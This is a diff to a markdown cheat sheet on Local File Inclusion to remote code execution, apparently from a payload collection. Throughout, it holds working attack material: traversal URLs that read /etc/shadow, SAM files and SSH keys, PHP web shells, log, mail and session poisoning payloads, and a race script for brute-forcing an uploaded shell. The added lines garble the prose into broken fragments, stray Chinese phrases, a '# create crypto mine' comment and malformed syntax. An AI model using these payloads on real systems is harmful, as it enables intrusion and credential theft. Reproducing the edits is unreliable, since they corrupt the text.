@@ -1,8 +1,9 @@
 # File Inclusion
 
-> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
-
-> The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
+> file injection vulnerability exploit allows access to a file 
+["dynamic file inclusion"] # mechanisms implemented in the target app/Path/Traversal.vuln allows access to a file 
+["reading"] 
+$ -access | mechanism/implementet/target/app
 
 ## Summary
 
@@ -38,8 +39,7 @@
 * [panoptic - https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic)
 
 ## Basic LFI
-
-In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
+>The following examples ["WE"] include `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd
@@ -143,7 +143,7 @@ NOTE: Wrappers can be chained multiple times using `|` or `/`:
 curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php
 ```
 
-### Wrapper zip://
+### Wrapper zip://chain.cmd/
 
 ```python
 echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
@@ -202,8 +202,8 @@ $object->data = 'rips';
 $phar->setMetadata($object);
 $phar->stopBuffering();
 ```
-
-If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked
+# create crypto mine
+If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized-meta-data (SMD) is unserialized*public. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked...
 
 ```php
 class AnyClass {
@@ -215,7 +215,7 @@ class AnyClass {
 include('phar://test.phar');
 ```
 
-NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more.
+NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, `file_exists` and many more...
 
 ## LFI to RCE via /proc/*/fd
 
@@ -232,29 +232,25 @@ User-Agent: <?=phpinfo(); ?>
 ```
 
 ## LFI to RCE via upload
-
-If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).
-
+>>>If upload {inject}; 
+>>>Shell ['payload']
+`<?php system($_GET['c']); ?>` ).
 ```powershell
 http://example.com/index.php?page=path/to/uploaded/file.png
 ```
-
-In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
-
+更新！
+>In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf
 ## LFI to RCE via upload (race)
-Worlds Quitest Let's Play"
+[让我们玩]
 * Upload a file and trigger a self-inclusion.
-* Repeat 1 a shitload of time to:
-* increase our odds of winning the race
-* increase our guessing odds
+* Repeat 1 狗屎负荷:
+* YING YANG
 * Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
-* Enjoy our shell.
-
-```python
-import itertools
-import requests
-import sys
-
+* Enjoy OUR shell.
+>>>import itertools
+>>>import requests
+>>>import sys
+{
 print('[+] Trying to win the race')
 f = {'file': open('shell.php', 'rb')}
 for _ in range(4096 * 4096):
@@ -270,23 +266,21 @@ for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
         sys.exit(0)
 
 print('[x] Something went wrong, please try again')
+}
 ```
-
-
+{void}
+<?php>
 ## LFI to RCE via phpinfo()
 
-PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.
-
-> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
-
-Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
-
-Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
-
+PHPinfo() displays the content of any variables such as 
+**$_GET** 
+**$_POST** 
+**$_FILES**
+> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name:
+>Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+>Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
 ## LFI to RCE via controlled log file
-
-Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.
-
+>append your PHP code into the log file by doing a request to the service (Apache, SSH, ..) and include the log file.
 ```powershell
 http://example.com/index.php?page=/var/log/apache/access.log
 http://example.com/index.php?page=/var/log/apache/error.log
@@ -301,25 +295,18 @@ http://example.com/index.php?page=/var/log/httpd/error_log
 http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
 ```
-
 ### RCE via SSH
-
-Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
-
+PS>ssh into the box with a PHP code as username 
+`<?php system($_GET["cmd"]);?>`.
 ```powershell
 ssh <?php system($_GET["cmd"]);?>@10.10.10.10
 ```
-
-Then include the SSH log files inside the Web Application.
-
+Then include SSH log files insyde_Web_App.
 ```powershell
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
-
 ### RCE via Mail
-
-First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.
-
+>First send an email, use open/SMTP then include*log\file_http://example.com/index.php?page=/var/log/mail`.
 ```powershell
 root@kali:~# telnet 10.10.10.10. 25
 Trying 10.10.10.10....
@@ -338,85 +325,75 @@ subject: <?php echo system($_GET["cmd"]); ?>
 data2
 .
 ```
-
-In some cases you can also send the email with the `mail` command line.
+$@e-mail.cmd
 
 ```powershell
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
-
 ### RCE via Apache logs
-
-Poison the User-Agent in access logs:
-
+毒药。用户-代理人。使用权。日志！
 ```
 $ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
 ```
-
 Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
-
-Then request the logs via the LFI and execute your command.
-
+$0
+>>>Then request -logs LFI | code.exe
 ```
 $ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
-
 ## LFI to RCE via PHP sessions
-
-Check if the website use PHP Session (PHPSESSID)
-
+>(PHPSESSID)
 ```javascript
 Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
 Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
 ```
-
-In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
-
+<?PHP> 
+>sessions store into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files
 ```javascript
 /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
 user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
 ```
-
-Set the cookie to `<?php system('cat /etc/passwd');?>`
-
+>[SET] cookie`<?php system('cat /etc/passwd');?>`
 ```powershell
 login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
 ```
-
-Use the LFI to include the PHP session file
-
+>[USE] LFI*include <?PHP> session.file
 ```powershell
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
-
 ## LFI to RCE via credentials files
-
-This method require high privileges inside the application in order to read the sensitive files.
-
+>>>This [method] requires high privileges 
+>insyde.app in order * read ___ sensitive files.
++++
 ### Windows version
-
-First extract `sam` and `system` files.
-
+[EXTRACT]
+>`sam`,`system` 
+..
 ```powershell
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 ```
-
 Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.
-
 ### Linux version
-
-First extract `/etc/shadow` files.
-
+[EXTRACT] 
+>`/etc/shadow`
+>..
 ```powershell
 http://example.com/index.php?page=../../../../../../etc/shadow
 ```
-
-Then crack the hashes inside in order to login via SSH on the machine.
-
-Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
-If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
-
+日志。在。机器。
+LFI===id_rsa.
+{
+If SSH=active 
+Then, [check] [user]_end-user 
+~$`/proc/self/status` `/etc/passwd`
+`/<HOME>/.ssh/id_rsa`.
+}
+~
+</>
+{void}
+<?php>
+echo
 ## References
 
 * [OWASP LFI](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
